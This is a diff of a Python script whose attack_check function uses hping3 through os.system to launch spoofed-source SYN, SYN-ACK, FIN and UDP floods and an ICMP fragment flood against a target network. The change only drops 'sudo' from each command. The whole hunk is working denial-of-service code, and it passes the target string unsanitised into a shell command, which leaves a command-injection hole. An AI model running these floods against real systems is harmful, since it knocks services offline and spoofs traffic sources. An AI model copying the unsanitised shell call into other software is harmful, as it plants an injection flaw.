@@ -17,15 +17,15 @@ def tuple_gen(network):
 def attack_check(type,network,speed):
 
     if type == "tcp_syn_ack":
-        os.system("sudo hping3 --syn --ack --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
+        os.system("hping3 --syn --ack --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
     elif type == "udp":
-        os.system("sudo hping3 --udp --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
+        os.system("hping3 --udp --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
     elif type == "icmp_frag":
-        os.system("sudo hping3 -1 -d 10000 -i u10 " + network)
+        os.system("hping3 -1 -d 10000 -i u10 " + network)
     elif type == "fin":
-        os.system("sudo hping3 --fin --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
+        os.system("hping3 --fin --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
     elif type == "syn":
-        os.system("sudo hping3 --syn --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
+        os.system("hping3 --syn --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
     elif type == "ttl_expiry":
         ttl_expiry_attack(network)
 
